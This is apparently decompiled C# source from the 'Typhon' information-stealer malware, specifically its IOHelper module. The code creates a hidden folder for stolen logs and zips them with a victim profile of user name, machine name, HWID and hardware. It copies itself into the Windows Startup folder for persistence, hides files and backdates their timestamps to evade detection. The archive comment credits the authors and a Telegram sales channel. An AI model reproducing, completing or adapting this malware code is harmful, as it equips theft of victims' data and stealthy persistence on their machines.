using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using Ionic.Zip;
using Typhon.Stealer.SystemInfo;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x0200003F RID: 63
	internal class IOHelper
	{
		// Token: 0x06000117 RID: 279 RVA: 0x0000949C File Offset: 0x0000769C
		public static bool IsInstalled()
		{
			return File.Exists(IOHelper.StartupPath + ".exe");
		}

		// Token: 0x06000118 RID: 280 RVA: 0x000094B4 File Offset: 0x000076B4
		public static string SetCWD()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + (Config.LogSaveDir.Contains("###") ? "@lernaean_hydra0" : Config.LogSaveDir);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Environment.CurrentDirectory = text;
			IOHelper.ChangeFileAttributes(0, text);
			return text;
		}

		// Token: 0x06000119 RID: 281 RVA: 0x00009510 File Offset: 0x00007710
		public static void CopyDirectory(string originalDirPath, string copyDirPath)
		{
			if (!Directory.Exists(copyDirPath))
			{
				Directory.CreateDirectory(copyDirPath);
			}
			foreach (string text in Directory.GetFiles(originalDirPath))
			{
				string fileName = Path.GetFileName(text);
				string destFileName = Path.Combine(copyDirPath, fileName);
				if (!File.Exists(text))
				{
					File.Copy(text, destFileName);
				}
			}
			foreach (string text2 in Directory.GetDirectories(originalDirPath))
			{
				string fileName2 = Path.GetFileName(text2);
				string copyDirPath2 = Path.Combine(copyDirPath, fileName2);
				if (!Directory.Exists(text2))
				{
					IOHelper.CopyDirectory(text2, copyDirPath2);
				}
			}
		}

		// Token: 0x0600011A RID: 282 RVA: 0x000095A4 File Offset: 0x000077A4
		internal static string CreateArchive(string directory, string zipName = null)
		{
			if (Directory.Exists(directory))
			{
				using (ZipFile zipFile = new ZipFile(Encoding.Default))
				{
					zipFile.CompressionLevel = 9;
					zipFile.Comment = string.Concat(new string[]
					{
						"\nTyphon-R v1.0 by @lernaean_hydra0 & @RaaSteK1337\nOfficial typhon updates channel: https://t.me/typhon_shop\n=========================================================\n\n\n=== System Info ===\nDate: ",
						UserDetails.GetDate(),
						"\nUser name: ",
						UserDetails.GetUserName(),
						"\nMachine name: ",
						UserDetails.GetMachineName(),
						"\nLanguage: ",
						UserDetails.GetLanguage(),
						"\nOperating System: ",
						UserDetails.GetSystemVersion(),
						"\n\n=== Hardware ===\nCPU: ",
						HardwareDetails.GetProcessorName(),
						"\nGPU: ",
						HardwareDetails.GetGraphicsCard(),
						"\nRAM: ",
						HardwareDetails.GetMemoryAmount(),
						"\nHWID: ",
						HardwareDetails.GetHWID(),
						"\nPower: ",
						HardwareDetails.GetBatteryStatus(),
						"\nScreen: ",
						HardwareDetails.GetScreenMetrics(),
						"\n"
					});
					zipFile.AddDirectory(directory);
					zipFile.Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp", zipName ?? (directory + ".zip")));
				}
				IOHelper.DeleteDirectory(directory, true);
			}
			return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp", zipName ?? (directory + ".zip"));
		}

		// Token: 0x0600011B RID: 283 RVA: 0x00009730 File Offset: 0x00007930
		public static void DeleteDirectory(string path, bool bDontDeleteFolder = false)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				foreach (string text in Directory.GetFiles(path))
				{
					Console.WriteLine("deleting " + text);
					File.Delete(text);
				}
				foreach (string text2 in Directory.GetDirectories(path))
				{
					IOHelper.DeleteDirectory(text2, false);
					Console.WriteLine("deleting " + text2);
					try
					{
						Directory.Delete(text2);
					}
					catch
					{
					}
				}
				if (!bDontDeleteFolder)
				{
					Directory.Delete(path);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600011C RID: 284 RVA: 0x000097DC File Offset: 0x000079DC
		public static void Install()
		{
			Console.WriteLine(IOHelper.RunningAssemblyLocation);
			Console.WriteLine(IOHelper.StartupPath);
			File.Copy(IOHelper.RunningAssemblyLocation, IOHelper.StartupPath + ".exe");
			Console.WriteLine("Copied");
			Thread.Sleep(5000);
			IOHelper.ChangeFileAttributes(0, IOHelper.StartupPath);
			IOHelper.ChangeFileAttributes(1, IOHelper.StartupPath);
			Console.WriteLine("Done");
		}

		// Token: 0x0600011D RID: 285 RVA: 0x0000984C File Offset: 0x00007A4C
		public static void ChangeFileAttributes(int mode, string fileOrDirectory)
		{
			switch (mode)
			{
			case 0:
				File.SetAttributes(fileOrDirectory, FileAttributes.Hidden);
				return;
			case 1:
				File.SetCreationTime(fileOrDirectory, new DateTime(DateTime.Now.Year - 1, 4, 11, 1, 26, 10));
				File.SetLastWriteTime(fileOrDirectory, new DateTime(DateTime.Now.Year - 1, 4, 11, 1, 26, 10));
				File.SetLastAccessTime(fileOrDirectory, new DateTime(DateTime.Now.Year - 1, 4, 11, 1, 26, 10));
				return;
			case 2:
				break;
			case 3:
				Directory.SetCreationTime(fileOrDirectory, new DateTime(DateTime.Now.Year - 1, 4, 11, 1, 26, 10));
				Directory.SetLastWriteTime(fileOrDirectory, new DateTime(DateTime.Now.Year - 1, 4, 11, 1, 26, 10));
				Directory.SetLastAccessTime(fileOrDirectory, new DateTime(DateTime.Now.Year - 1, 4, 11, 1, 26, 10));
				break;
			default:
				return;
			}
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00009948 File Offset: 0x00007B48
		public static long GetDirectorySize(string path)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			return directoryInfo.GetFiles().Sum((FileInfo fi) => fi.Length) + directoryInfo.GetDirectories().Sum((DirectoryInfo di) => IOHelper.GetDirectorySize(di.FullName));
		}

		// Token: 0x04000093 RID: 147
		internal static string StartupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", Config.StartupName + ".exe");

		// Token: 0x04000094 RID: 148
		public static string RunningAssemblyLocation = Assembly.GetExecutingAssembly().Location;
	}
}
